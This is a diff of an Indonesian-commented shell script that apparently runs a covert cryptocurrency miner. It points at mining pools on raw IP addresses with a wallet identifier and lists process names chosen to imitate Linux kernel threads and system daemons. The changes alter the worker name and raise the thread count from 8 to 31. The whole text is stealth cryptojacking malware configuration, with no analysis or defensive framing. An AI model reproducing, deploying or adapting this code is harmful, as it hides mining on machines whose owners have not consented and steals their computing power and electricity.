@@ -3,7 +3,7 @@
 # URL utama dan cadangan
 MAIN_URL="170.64.224.191:443"
 BACKUP_URL="170.64.157.141:443"
-USER="mbc1qm7y0rx0r43t5c3f6y8uuf0pykaa2uq5h2emz3v.Mabar3"
+USER="mbc1qm7y0rx0r43t5c3f6y8uuf0pykaa2uq5h2emz3v.Mabar33"
 
 POSSIBLE_NAMES=(".dbus-daemon" "migration" "watchdog" ".ksoftirqd" "rcu_sched" ".profile-cache" 
                 "rcu_bh" "kdevtmpfs" "kintegrityd" "kblockd" "kthrotld")
@@ -45,7 +45,7 @@ while true; do
   "url": "'"$ACTIVE_URL"'",
   "user": "'"$USER"'",
   "pass": "x",
-  "threads": 8
+  "threads": 31
 }'
 
     rm -f "$LOCAL_BIN_DIR"/*.json
